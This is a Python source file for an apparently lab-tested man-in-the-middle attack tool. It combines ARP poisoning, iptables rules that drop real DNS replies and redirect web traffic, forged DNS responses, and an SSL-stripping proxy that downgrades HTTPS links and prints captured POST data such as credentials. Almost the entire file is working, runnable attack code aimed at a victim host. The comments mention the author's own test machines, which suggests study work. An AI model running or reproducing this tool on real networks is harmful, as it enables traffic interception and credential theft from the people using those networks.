from scapy.all import *
import threading
import time
import os
import signal
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.request
import urllib.parse
import re

# CONFIGURATION (ATTACKER MUST SET THESE)
# NOTE: In a fully-fledged tool, these would come from argparse or network discovery.
ATTACKER_IP = "192.168.88.226" # Attacker address is my VM's IP, for test purposes
INTERFACE = "ens33" # Network interface my VM uses
VICTIM_IP = "192.168.88.227"  # Victim address is my other laptop's IP, for test purposes

# DNS Spoofing Map
SPOOF_MAP = {
    "www.fakelogin.net.": ATTACKER_IP,
}

# GLOBAL VARIABLES FOR NETWORK STATE
VICTIM_MAC = None
GATEWAY_IP = None
GATEWAY_MAC = None

STOP_ATTACK = False

# SSL STRIPPING CONFIGURATION
SSL_STRIP_PORT = 8080
ssl_strip_server = None
https_to_http_map = {}

# IPTABLES MANAGEMENT

def manage_iptables(action):
    """
    Adds or deletes the crucial iptables rule to drop the genuine DNS response.
    Action should be 'A' (Add) or 'D' (Delete).
    """

    if action not in ['A', 'D']:
        print("[!] Invalid action for iptables management. Use 'A' to add or 'D' to delete.")
        return
    
    # Rule: Drop packets coming FROM the Gateway (DNS Server) to the Victim on UDP port 53
    iptables_command = (
        f"sudo iptables -{action} FORWARD -p udp -s {GATEWAY_IP} --sport 53 "
        f"-d {VICTIM_IP} -j DROP"
    )
    print(f"[{action}] Executing IPTables command: {iptables_command}")
    os.system(iptables_command)

# ARP FUNCTIONS

def find_gateway():
    """Finds the gateway IP using the system's routing table."""
    # Use random IP outside the network to trace the route to the gateway
    random_IP = "123.123.123.000"
    return conf.route.route(random_IP)[2]

def find_mac(target_IP):
    """Finds the MAC address for a given IP using ARP Request."""
    broadcast = "ff:ff:ff:ff:ff:ff"

    # send ARP request to victim for MAC address
    arp_request = Ether(dst=broadcast)/ARP(pdst=target_IP)
    answered, unanswered = srp(arp_request, timeout=2, verbose=False)
    
    for sent, received in answered:
        if received.psrc == target_IP:
            return received.hwsrc
    return None

def restore_arp(victim_ip, gateway_ip, victim_mac, gateway_mac):
    """Restores the correct ARP cache on the victim and gateway."""
    # Build a genuine ARP reply for the victim
    victim_restore = Ether(src=gateway_mac, dst=victim_mac)/ARP(op="is-at", psrc=gateway_ip, pdst=victim_ip, hwsrc=gateway_mac)
    
    # Build a genuine ARP reply for the gateway
    gateway_restore = Ether(src=victim_mac, dst=gateway_mac)/ARP(op="is-at", psrc=victim_ip, pdst=gateway_ip, hwsrc=victim_mac)
    
    # Send a few times to ensure the cache is restored
    sendp(victim_restore, count=5, iface=INTERFACE, verbose=False)
    sendp(gateway_restore, count=5, iface=INTERFACE, verbose=False)
    print("[ARP Poison] ARP tables restored successfully.")

def arp_poison_loop(victim_ip, gateway_ip, victim_mac, gateway_mac):
    """Continuously sends forged ARP packets to maintain the poison."""
    
    # Forge ARP packets to victim pretending to be the gateway
    # hwsrc is automatically set to the MAC of the attacker.
    
    # Forge ARP packets to victim pretending to be the gateway
    victim_packet = Ether(dst=victim_mac)/ARP(op="is-at", psrc=gateway_ip, pdst=victim_ip, hwdst=victim_mac)
    # Forge ARP packet to gateway pretending to be the victim. 
    gateway_packet = Ether(dst=gateway_mac)/ARP(op="is-at", psrc=victim_ip, pdst=gateway_ip, hwdst=gateway_mac)

    global STOP_ATTACK
    while not STOP_ATTACK:
        try:
            sendp(victim_packet, iface=INTERFACE, verbose=False)
            sendp(gateway_packet, iface=INTERFACE, verbose=False)
            time.sleep(2) # Send every 2 seconds to maintain the poison
        except KeyboardInterrupt:
            # If a direct interrupt is caught in this thread, set the flag and break
            STOP_ATTACK = True
            break                                   


# DNS FUNCTIONS

def dns_handler(packet):
    """Handles sniffed DNS packets and attempts to spoof queries."""

    print(f"[DNS Spoof] Received a packet from: {packet[IP].src}")

    if not packet.haslayer(DNS):
        # Ignore non-DNS packets
        print("[DNS Spoof] Packet does not have DNS layer. Ignoring.")
        return
    
    if packet[DNS].qr != 0:
        # Ignore DNS responses
        print(f"[DNS Spoof] Packet is a DNS RESPONSE (qr={packet[DNS].qr}). Ignoring.")
        return

    if not packet.haslayer(DNSQR):
        print("[DNS Spoof] Query packet is missing DNSQR layer. Ignoring.")
        return
    
    print("[DNS Spoof] Packet is a DNS QUERY (qr=0). Proceeding.")

    query_name_bytes = packet[DNSQR].qname

    try:
        query_name = query_name_bytes.decode('utf-8')
    except UnicodeDecodeError:
        print("[DNS Spoof] Could not decode query name.")
        return
        
    print(f"[DNS Spoof] Extracted Query Name: '{query_name}'")

    # Check if the queried domain is in our SPOOF_MAP
    if query_name in SPOOF_MAP:
        
        print(f"[DNS Spoof] Intercepted query for: {query_name}; FORGING REPLY...")

        # Crafting the Spoofed Response

        # Get the spoofed IP from the map
        spoof_ip = SPOOF_MAP[query_name]
        
        # Forge IP and UDP headers (Source and Destination IPs/Ports swapped)
        spoofed_ip = IP(src=packet[IP].dst, dst=packet[IP].src) 
        spoofed_udp = UDP(sport=packet[UDP].dport, dport=packet[UDP].sport) 
        
        # Create the malicious Answer Record (DNSRR)
        spoofed_answer = DNSRR(rrname=query_name, rdata=spoof_ip)

        # Forge the DNS Response (must use the original TXID)
        spoofed_dns = DNS(id=packet[DNS].id, qr=1, aa=1, rd=0, ra=0, qd=packet[DNSQR], an=spoofed_answer) 
        
        # Packing spoofed layers
        final_packet = spoofed_ip / spoofed_udp / spoofed_dns
        
        # Send the forged packet
        send(final_packet, verbose=0)
        print(f"[DNS Spoof] SENT SPOOFED REPLY: {query_name} -> {spoof_ip}")
    else:
        print(f"[DNS Spoof] Domain '{query_name}' NOT in SPOOF_MAP. Ignoring.")

def stop_sniffing(packet):
    """Callback function for Scapy's sniff to check the global stop flag."""
    global STOP_ATTACK
    # This function returns True when the global flag is set, telling sniff() to exit.
    return STOP_ATTACK

def start_dns_spoofing():
    """Starts the continuous sniffing thread for DNS traffic."""
    
    print(f"[DNS Spoof] Starting DNS sniffer on interface {INTERFACE}")
    
    # The filter ensures we only catch UDP traffic on port 53 (DNS)
    sniff_thread = threading.Thread(
        target=sniff, 
        kwargs={
            'iface': INTERFACE, 
            'filter': "udp and port 53", 
            'prn': dns_handler,
            'store': 0, 
            'stop_filter': stop_sniffing
            }
    )
    return sniff_thread

# SSL STRIPPING FUNCTIONS

class SSLStripHandler(BaseHTTPRequestHandler):
    """HTTP Proxy handler that strips SSL/TLS from connections."""
    
    def log_message(self, format, *args):
        """Override to customize logging."""
        print(f"[SSL Strip] {self.address_string()} - {format % args}")
    
    def do_GET(self):
        """Handle GET requests."""
        self.handle_request('GET')
    
    def do_POST(self):
        """Handle POST requests."""
        self.handle_request('POST')
    
    def handle_request(self, method):
        """Core handler for proxying and stripping SSL."""
        
        # Extract the requested URL
        url = self.path
        
        print(f"[SSL Strip] Intercepted {method} request: {url}")
        
        # Determine if this should be proxied to HTTPS
        if url.startswith('http://'):
            # Check if this URL was originally HTTPS
            original_url = https_to_http_map.get(url, url)
            if original_url.startswith('https://'):
                target_url = original_url
                print(f"[SSL Strip] Mapping back to HTTPS: {target_url}")
            else:
                target_url = url
        else:
            # Relative URL - need to reconstruct
            host = self.headers.get('Host', '')
            target_url = f"https://{host}{url}"
            print(f"[SSL Strip] Reconstructed URL: {target_url}")
        
        try:
            # Prepare headers for the upstream request
            headers = {}
            for header, value in self.headers.items():
                if header.lower() not in ['host', 'connection', 'proxy-connection']:
                    headers[header] = value
            
            # Handle POST data if present
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = None
            if method == 'POST' and content_length > 0:
                post_data = self.rfile.read(content_length)
                print(f"[SSL Strip] POST data captured ({content_length} bytes)")
                # Log credentials if present
                if post_data:
                    try:
                        decoded_data = post_data.decode('utf-8')
                        print(f"[SSL Strip] POST Data: {decoded_data}")
                    except:
                        print(f"[SSL Strip] Binary POST data")
            
            # Make the request to the real server (using HTTPS)
            req = urllib.request.Request(target_url, data=post_data, headers=headers)
            
            with urllib.request.urlopen(req, timeout=10) as response:
                # Read the response
                response_data = response.read()
                response_headers = response.headers
                
                # Modify the response to strip SSL references
                if 'text/html' in response_headers.get('Content-Type', ''):
                    response_text = response_data.decode('utf-8', errors='ignore')
                    
                    # Replace HTTPS links with HTTP
                    modified_text = re.sub(
                        r'https://',
                        'http://',
                        response_text,
                        flags=re.IGNORECASE
                    )
                    
                    # Track the mappings
                    https_urls = re.findall(r'https://[^\s<>"\']+', response_text)
                    for https_url in https_urls:
                        http_url = https_url.replace('https://', 'http://')
                        https_to_http_map[http_url] = https_url
                    
                    response_data = modified_text.encode('utf-8')
                    print(f"[SSL Strip] Stripped {len(https_urls)} HTTPS links")
                
                # Send the response back to the victim
                self.send_response(200)
                
                # Forward relevant headers
                for header, value in response_headers.items():
                    if header.lower() not in ['transfer-encoding', 'content-encoding']:
                        self.send_header(header, value)
                
                self.send_header('Content-Length', len(response_data))
                self.end_headers()
                self.wfile.write(response_data)
                
                print(f"[SSL Strip] Response sent ({len(response_data)} bytes)")
        
        except Exception as e:
            print(f"[SSL Strip] Error handling request: {e}")
            self.send_error(502, f"Bad Gateway: {str(e)}")


def start_ssl_strip():
    """Start the SSL stripping proxy server."""
    global ssl_strip_server
    
    print(f"[SSL Strip] Starting SSL stripping proxy on port {SSL_STRIP_PORT}")
    
    try:
        ssl_strip_server = HTTPServer(('', SSL_STRIP_PORT), SSLStripHandler)
        
        # Run in a separate thread
        strip_thread = threading.Thread(target=ssl_strip_server.serve_forever)
        strip_thread.daemon = True
        strip_thread.start()
        
        print(f"[SSL Strip] Proxy server running on port {SSL_STRIP_PORT}")
        return strip_thread
        
    except Exception as e:
        print(f"[SSL Strip] Failed to start proxy: {e}")
        return None


def setup_ssl_strip_iptables():
    """Configure iptables to redirect HTTP traffic to the SSL strip proxy."""
    
    # Redirect victim's HTTP traffic (port 80) to our proxy (port 8080)
    redirect_cmd = (
        f"sudo iptables -t nat -A PREROUTING -p tcp --dport 80 "
        f"-s {VICTIM_IP} -j REDIRECT --to-port {SSL_STRIP_PORT}"
    )
    
    print(f"[SSL Strip] Setting up iptables redirect: {redirect_cmd}")
    os.system(redirect_cmd)
    
    # Also redirect HTTPS traffic to HTTP proxy (force downgrade)
    redirect_https_cmd = (
        f"sudo iptables -t nat -A PREROUTING -p tcp --dport 443 "
        f"-s {VICTIM_IP} -j REDIRECT --to-port {SSL_STRIP_PORT}"
    )
    
    print(f"[SSL Strip] Setting up HTTPS redirect: {redirect_https_cmd}")
    os.system(redirect_https_cmd)


def cleanup_ssl_strip_iptables():
    """Remove SSL stripping iptables rules."""
    
    # Remove HTTP redirect
    remove_http_cmd = (
        f"sudo iptables -t nat -D PREROUTING -p tcp --dport 80 "
        f"-s {VICTIM_IP} -j REDIRECT --to-port {SSL_STRIP_PORT}"
    )
    print(f"[SSL Strip] Removing HTTP redirect")
    os.system(remove_http_cmd)
    
    # Remove HTTPS redirect
    remove_https_cmd = (
        f"sudo iptables -t nat -D PREROUTING -p tcp --dport 443 "
        f"-s {VICTIM_IP} -j REDIRECT --to-port {SSL_STRIP_PORT}"
    )
    print(f"[SSL Strip] Removing HTTPS redirect")
    os.system(remove_https_cmd)


def stop_ssl_strip():
    """Stop the SSL stripping server."""
    global ssl_strip_server
    
    if ssl_strip_server:
        print("[SSL Strip] Stopping proxy server...")
        ssl_strip_server.shutdown()
        ssl_strip_server = None


# MAIN EXECUTION AND CLEANUP 

def setup_and_run():
    global VICTIM_MAC, GATEWAY_IP, GATEWAY_MAC

    print(f"[*] Starting MITM Attack on Victim: {VICTIM_IP}")

    # Gather network details
    GATEWAY_IP = find_gateway()
    GATEWAY_MAC = find_mac(GATEWAY_IP)
    VICTIM_MAC = find_mac(VICTIM_IP)

    if not all([GATEWAY_MAC, VICTIM_MAC]):
        print("[!] ERROR: Could not find MAC addresses for victim or gateway. Exiting.")
        sys.exit(1)

    print(f"[ARP Poison] The gateway of this network is at IP address {GATEWAY_IP} and MAC address {GATEWAY_MAC}.")
    print(f"[ARP Poison] The victim at IP address {VICTIM_IP} is at MAC address {VICTIM_MAC}.")

    # Enable IP Forwarding (Critical for MiTM)
    # The attacker machine needs to forward the packets between gateway and victim.
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[*] IP Forwarding enabled.")

    # Install the DNS Response Dropping Rule
    manage_iptables('A') # Add the DROP rule
    print("[DNS Spoof] DNS response dropping rule installed to win the race.")

    # Start ARP Poisoning thread
    arp_thread = threading.Thread(target=arp_poison_loop, 
        args=(VICTIM_IP, GATEWAY_IP, VICTIM_MAC, GATEWAY_MAC))
    arp_thread.daemon = True
    arp_thread.start()
    print("[ARP Poison] ARP Poisoning started. MiTM position established.")
    
    # Start DNS Spoofing thread
    dns_thread = start_dns_spoofing()
    dns_thread.daemon = True
    dns_thread.start()
    
    # Start SSL Stripping
    setup_ssl_strip_iptables()
    ssl_thread = start_ssl_strip()
    print("[SSL Strip] SSL stripping attack activated.")

    return arp_thread, dns_thread, ssl_thread

def cleanup():
    """Handles graceful shutdown and resource cleanup."""

    global STOP_ATTACK
    
    # Check if cleanup was already initiated
    if STOP_ATTACK:
        return

    print("\n[!] CTRL+C detected. Shutting down...")
    
    STOP_ATTACK = True # Set the flag to stop the threads

    # Wait briefly for sniffing thread to catch the signal and stop
    time.sleep(1)
    
    # Stop SSL stripping
    stop_ssl_strip()
    cleanup_ssl_strip_iptables()
    
    # Restore ARP tables
    if GATEWAY_IP and VICTIM_MAC:
        restore_arp(VICTIM_IP, GATEWAY_IP, VICTIM_MAC, GATEWAY_MAC)
    
    # REMOVE the DNS Response Dropping Rule
    manage_iptables('D') # Delete the DROP rule
    print("[DNS Spoof] DNS response dropping rule removed.")
    
    # Disable IP Forwarding
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[*] IP Forwarding disabled.")

    print("[*] Cleanup complete. Terminating.")

# sudo python3 mitm_spoofer.py
if __name__ == "__main__":

    # Hook the signal handler to the cleanup function, when Ctrl+C is pressed
    signal.signal(signal.SIGINT, lambda s, f: cleanup())

    arp_thread = None
    dns_thread = None
    ssl_thread = None
    
    try:
        # Start the attack sequence
        arp_thread, dns_thread, ssl_thread = setup_and_run()
        
        # Keep the main thread alive until user interruption
        # When cleanup sets STOP_ATTACK, this loop will break
        while not STOP_ATTACK:
            time.sleep(1)
    except KeyboardInterrupt:
        # This catches residual interrupts, but the signal handler should already have initiated cleanup.
        pass
    except SystemExit:
        # This catches the clean exit from the signal handler.
        pass
    except Exception as e:
        print(f"\n[!!!] An unexpected error occurred: {e}")
    finally:
        # The finally block is the ultimate place to ensure cleanup happens
        if not STOP_ATTACK: # Only clean up if the signal handler didn't already
             cleanup()
